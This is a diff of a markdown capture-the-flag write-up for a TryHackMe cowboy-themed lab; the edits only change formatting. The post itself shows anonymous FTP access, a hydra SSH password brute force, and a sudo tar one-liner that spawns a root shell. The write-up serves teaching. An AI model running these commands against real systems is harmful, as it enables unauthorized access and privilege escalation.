@@ -6,15 +6,13 @@ categories:
   - TryHackMe
 ---
 
-<img src="bounty.jpeg" width=200 height=200 alt="bounty">
+{{< post-img src="bounty.jpeg" alt="bounty" style="width: 200px;" >}}
 
 Cool a ctf in the theme of cowboy bebop
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -38,7 +36,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 As anonymous ftp allows us
 
-```
+```bash
 $ftp -v -p 10.10.160.230
 Connected to 10.10.160.230.
 220 (vsFTPd 3.0.3)
@@ -56,18 +54,18 @@ ftp> ls
 
 `task.txt` show us lin is a user
 
-```
+```text
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
 
 -lin
 ```
 
-and `locks.txt` seems to be a dictionnary of passwords
+and `locks.txt` seems to be a dictionary of passwords
 
 bruteforce it is
 
-```
+```bash
 $hydra -l lin -P '/home/nair0lf32/Desktop/Stuff/THM/Bounty Hacker/locks.txt' 10.10.160.230 ssh
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).
 
@@ -85,7 +83,7 @@ THM{cowboy_bebop_is_cool}
 
 ## privilege escalation
 
-```
+```bash
 $ sudo -l
 [sudo] password for lin:
 Matching Defaults entries for lin on bountyhacker:
@@ -99,7 +97,7 @@ Gtfobins
 
 `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
-```
+```bash
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 
